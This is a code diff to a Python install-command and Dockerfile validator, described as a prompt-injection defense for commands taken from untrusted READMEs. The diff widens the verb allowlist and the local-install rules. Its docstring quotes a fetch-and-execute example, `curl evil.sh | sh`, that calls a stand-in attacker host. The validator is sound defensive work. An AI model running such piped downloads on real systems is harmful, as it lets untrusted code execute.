@@ -1,7 +1,6 @@
 """Command validator — the prompt-injection defense.
 
-Install commands are derived from an UNTRUSTED README (and later from an LLM
-reading that README). A malicious repo can try to smuggle
+Install commands are derived from an UNTRUSTED README. A malicious repo can try to smuggle
 `curl evil.sh | sh` into the command we execute. Docker limits the blast radius,
 but the build step has network and runs arbitrary RUN lines — so every install
 command passes this allowlist before it is ever executed.
@@ -15,23 +14,48 @@ Rules (docs/architecture.md):
 """
 from __future__ import annotations
 
+import os
 import re
 from dataclasses import dataclass
 
-# Leading verbs we permit. Longest-first so "pip3 install" wins over "pip".
+# Leading verbs we permit. Longest-first matching, so "pip3 install" wins over
+# "pip". This list WILL go stale — package managers keep appearing (uv broke it
+# once already) — so treat it as a sanity check, not the security boundary. The
+# shell-hygiene rules below are what actually stop fetch-and-execute.
+# Extend at runtime with PENSTATION_EXTRA_INSTALL_VERBS="foo install,bar add".
 ALLOWED_VERBS = (
-    "go install", "go get",
+    # python
     "pip3 install", "pip install", "pipx install",
-    "npm install", "npm i",
-    "cargo install",
-    "docker build", "docker pull",
-    "git clone",
-    "make",
+    "uv sync", "uv pip install", "uv tool install", "uv add", "uv run",
+    "poetry install", "poetry add", "pdm install", "pipenv install",
+    "python -m pip install", "python3 -m pip install",
+    # go
+    "go install", "go get", "go build",
+    # node
+    "npm install", "npm i", "npm ci", "pnpm install", "pnpm add",
+    "yarn install", "yarn add", "bun install", "bun add",
+    # rust / ruby / php
+    "cargo install", "cargo build", "gem install", "composer install",
+    # containers + source
+    "docker build", "docker pull", "git clone",
+    # build + dependency steps that legitimately lead a recipe
+    "make", "cmake", "apk add", "apt-get install", "apt-get update",
+    "bash install.sh", "sh install.sh",
 )
+
+
+def _extra_verbs() -> tuple[str, ...]:
+    raw = os.environ.get("PENSTATION_EXTRA_INSTALL_VERBS", "")
+    return tuple(v.strip().lower() for v in raw.split(",") if v.strip())
+
 
 # Verbs that operate on an already-local checkout, so they can't be expected to
 # name the repo.
-LOCAL_VERBS = ("make",)
+LOCAL_VERBS = ("make", "cmake", "uv sync", "uv run", "poetry install",
+               "pdm install", "pipenv install", "npm install", "npm ci",
+               "pnpm install", "yarn install", "bun install", "go build",
+               "cargo build", "composer install", "apk add", "apt-get install",
+               "apt-get update", "bash install.sh", "sh install.sh")
 
 # Shell metacharacters that enable chaining/substitution/redirection.
 FORBIDDEN_CHARS = {
@@ -70,10 +94,30 @@ class Result:
 
 def _verb(cmd: str) -> str | None:
     low = cmd.lower()
-    for verb in sorted(ALLOWED_VERBS, key=len, reverse=True):
+    for verb in sorted(ALLOWED_VERBS + _extra_verbs(), key=len, reverse=True):
         if low.startswith(verb):
             return verb
     return None
+
+
+def _is_local(cmd: str, verb: str) -> bool:
+    """Does this command operate on an already-local checkout?
+
+    Such commands can't be expected to name the repo. Besides the always-local
+    verbs, any `-r requirements.txt` / `--requirement` form qualifies: GitGot's
+    README says `pip3 install -r requirements.txt`, which got rejected as an
+    "unrelated source" even though it is the repo's own documented install.
+    """
+    if verb in LOCAL_VERBS:
+        return True
+    # `-r requirements.txt` — installs from a file in the checkout.
+    if re.search(r"(^|\s)(-r|--requirement)(\s|=)", cmd):
+        return True
+    # `pip install .` / `pip install -e .` — the target *is* the checkout, so
+    # naming the repo is impossible. Rejecting these emptied the recipe list for
+    # any script-shaped-but-packaged repo (cloud_enum), pushing a solvable
+    # install list empty for no reason.
+    return bool(re.search(r"(^|\s)(-e\s+)?\.(\s|$)", cmd))
 
 
 def validate_install(cmd: str, owner: str = "", repo: str = "") -> Result:
@@ -100,7 +144,7 @@ def validate_install(cmd: str, owner: str = "", repo: str = "") -> Result:
         if pat.search(cmd):
             return Result(False, f"{why} not allowed in an install command")
 
-    if verb not in LOCAL_VERBS and (owner or repo):
+    if not _is_local(cmd, verb) and (owner or repo):
         low = cmd.lower()
         if (repo and repo.lower() in low) or (owner and owner.lower() in low):
             pass
@@ -111,7 +155,7 @@ def validate_install(cmd: str, owner: str = "", repo: str = "") -> Result:
     return Result(True)
 
 
-# Base images we allow an LLM-written Dockerfile to start FROM. Pinning to
+# Base images a generated Dockerfile may start FROM. Pinning to
 # official images stops a repaired Dockerfile from pulling an arbitrary one.
 ALLOWED_BASES = ("golang", "python", "node", "rust", "alpine", "debian", "ubuntu",
                  "busybox", "gcr.io/distroless/")
@@ -130,7 +174,7 @@ MAX_DOCKERFILE_LINES = 60
 
 
 def validate_dockerfile(text: str) -> Result:
-    """Gate an LLM-written Dockerfile before it is built."""
+    """Gate a generated Dockerfile before it is built."""
     df = (text or "").strip()
     if not df:
         return Result(False, "empty Dockerfile")
